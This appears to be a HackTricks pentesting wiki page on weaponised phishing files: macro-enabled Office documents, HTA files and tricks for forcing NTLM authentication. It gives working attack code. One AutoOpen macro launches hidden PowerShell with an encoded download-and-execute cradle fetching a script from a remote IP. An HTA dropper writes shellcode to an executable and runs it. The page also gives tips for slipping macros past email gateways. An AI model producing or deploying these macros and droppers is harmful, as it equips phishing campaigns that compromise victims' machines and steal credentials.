# Phishing Files & Documents

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

## Office Documents

Microsoft Word performs file data validation prior to opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.

Usually Word files containing macros uses the `.docm` extension. However, it's possible to rename the file changing the file extension and still keep their macro executing capabilities.\
For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).

You can use the following command to check which extensions are going to be executed by some Office programs:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### Macros Backdoor

It's possible to use macros to run arbitrary code form the document.

#### Autoload functions

The more common they are, the more probable the AV will detect it.

* AutoOpen()
* Document\_Open()

#### Macros Code Examples

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Manually remove metadata

Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.

#### Doc Extension

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

* MacOS
  * [**macphish**](https://github.com/cldrn/macphish)
  * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a proprietary Windows program whose **source code consists of HTML and one or more scripting languages** supported by Internet Explorer (VBScript and JScript). The HTML is used to generate the user interface and the scripting language for the program logic. An **HTA executes without the constraints of the browser's security model**, so it executes as a "fully trusted" application.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**. In fact, **`mshta` is dependant on IE**, so if it has been uninstalled, HTAs will be unable to execute.

<pre class="language-html"><code class="lang-html"><strong>&#x3C;--! Basic HTA Execution -->
</strong>&#x3C;html>
  &#x3C;head>
    &#x3C;title>Hello World&#x3C;/title>
  &#x3C;/head>
  &#x3C;body>
    &#x3C;h2>Hello World&#x3C;/h2>
    &#x3C;p>This is an HTA...&#x3C;/p>
  &#x3C;/body>

  &#x3C;script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  &#x3C;/script>
&#x3C;/html>
</code></pre>

```html
<--! Cobal Strike generated HTA withot shellcode -->
<script language="VBScript">
	Function var_func()
		var_shellcode = "<shellcode>"

		Dim var_obj
		Set var_obj = CreateObject("Scripting.FileSystemObject")
		Dim var_stream
		Dim var_tempdir
		Dim var_tempexe
		Dim var_basedir
		Set var_tempdir = var_obj.GetSpecialFolder(2)
		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
		var_obj.CreateFolder(var_basedir)
		var_tempexe = var_basedir & "\" & "evil.exe"
		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
		For i = 1 to Len(var_shellcode) Step 2
		    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
		Next
		var_stream.Close
		Dim var_shell
		Set var_shell = CreateObject("Wscript.Shell")
		var_shell.run var_tempexe, 0, true
		var_obj.DeleteFile(var_tempexe)
		var_obj.DeleteFolder(var_basedir)
	End Function

	var_func
	self.close
</script>
```



## Forcing NTLM Authentication

There are several ways to **force NTLM authentication "remotely"**, for example you could add **invisible images** to emails or HTMLs that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**

**Check this ideas and more in the following pages:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM Relay

Don't forget that you cannot only steal the hash or the authentication, but also **perform NTLM relay attacks**:

* [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)****
* ****[**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)****

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
